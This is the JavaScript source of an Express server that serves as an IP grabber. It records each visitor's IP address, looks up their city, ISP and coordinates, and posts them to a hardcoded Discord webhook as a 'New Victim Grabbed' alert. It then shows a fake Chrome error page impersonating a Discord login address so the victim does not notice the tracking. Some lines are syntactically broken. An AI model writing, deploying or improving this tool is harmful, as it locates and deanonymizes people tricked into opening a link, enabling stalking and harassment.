const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// CHANGE ONLY THIS LINE — your webhook
const DISCORD_WEBHOOK 'https://discord.com/api/webhooks/1441788885268041788/n17DxZidjM-rc_RldYGa_ROF4zzohKWlcK_ZhyY3-Cf07O0LJRPNE3XA4MmIleWdQQCM';

app.set('trust proxy', true);

function getClientIp(req) {
  let ip = (req.headers['x-forwarded-for'] || '').split(',').shift().trim();
  if (!ip) ip = req.ip || req.socket?.remoteAddress || req.connection?.remoteAddress || 'unknown';
  if (ip.startsWith('::ffff:')) ip = ip.split('::ffff:')[1];
  return ip;
}

async function fetchGeoForIp(ip) {
  try {
    const res = await axios.get(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,regionName,city,isp,lat,lon,query`, { timeout: 5000 });
    return res.data;
  } catch {
    return { status: 'fail', query: ip };
  }
}

async function sendToDiscord(data) {
  const map = data.lat && data.lon ? `https://www.google.com/maps?q=\( {data.lat}, \){data.lon}` : 'N/A';
  const embed = {
    title: 'New Victim Grabbed',
    color: 16711680,
    timestamp: new Date().toISOString(),
    thumbnail: { url: 'https://i.imgur.com/8X8gT3Z.png' },
    fields: [
      { name: 'IP', value: `\`${data.query || data.ip}\``, inline: true },
      { name: 'Country', value: `\( {data.country || 'Unknown'} \){data.countryCode ? '• ' + data.countryCode : ''}`, inline: true },
      { name: 'City', value: data.city || 'Unknown', inline: true },
      { name: 'ISP', value: data.isp || 'Unknown', inline: true },
      { name: 'Location', value: `[Google Maps](${map})`, inline: false }
    ]
  };

  try {
    await axios.post(DISCORD_WEBHOOK, { content: '@everyone', embeds: [embed] });
  } catch (err) {
    console.error('Webhook failed:', err.message);
  }
}

// MAIN ROUTE — serves fake Chrome error + grabs IP
app.get('*', async (req, res) => {
  const ip = getClientIp(req);
  const geo = await fetchGeoForIp(ip);

  // Log to Discord
  await sendToDiscord({
    ip,
    query: geo.query || ip,
    country: geo.country || 'Unknown',
    countryCode: geo.countryCode,
    city: geo.city,
    isp: geo.isp,
    lat: geo.lat,
    lon: geo.lon
  });

  // Serve ultra-realistic Chrome error page
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>This site can’t be reached</title>
  <style>
    body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f6f9fc;color:#3c4043;padding:40px}
    .container{max-width:580px;margin:0 auto;background:#fff;border-radius:8px;padding:40px;box-shadow:0 2px 10px rgba(0,0,0,.1);text-align:center}
    .icon{width:72px;height:72px;background:#dadce0;border-radius:50%;margin:0 auto 24px;position:relative}
    .icon::after{content:"!";font-size:44px;font-weight:bold;color:#70757a;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}
    h1{font-size:24px;margin:0 0 16px;color:#3c4043}
    .err{font-weight:bold;color:#d93025}
    .url{color:#1a0dab;margin:8px 0;font-size:14px}
    .suggestions{margin:32px 0 0;padding-left:20px;text-align:left;color:#5f6368;font-size:14px}
    .suggestions li{margin:12px 0}
    .footer{margin-top:48px;font-size:12px;color:#9aa0a6}
  </style>
</head>
<body>
  <div class="container">
    <div class="icon"></div>
   -visually-hidden
    <h1>This site can’t be reached</h1>
    <p>The webpage at <span class="url">https://login.discordapp.com</span> might be temporarily down or it may have moved permanently to a new web address.</p>
    <p class="err">ERR_CONNECTION_TIMED_OUT</p>

    <div class="suggestions">
      <ul>
        <li>Check your internet connection</li>
        <li>Try again later</li>
        <li>Check if there is a typo in the address</li>
        <li>Clear your browser cache</li>
      </ul>
    </div>

    <div class="footer">
      Grabbed from \( {geo.country || 'Unknown'} \){geo.countryCode ? '• ' + geo.countryCode : ''}
    </div>
  </div>
</body>
</html>
  `);
});

app.listen(PORT, () => {
  console.log(`Fake error logger running on port ${PORT}`);
  console.log(`Send victims here → https://your-app.onrender.com (or any path)`);
});
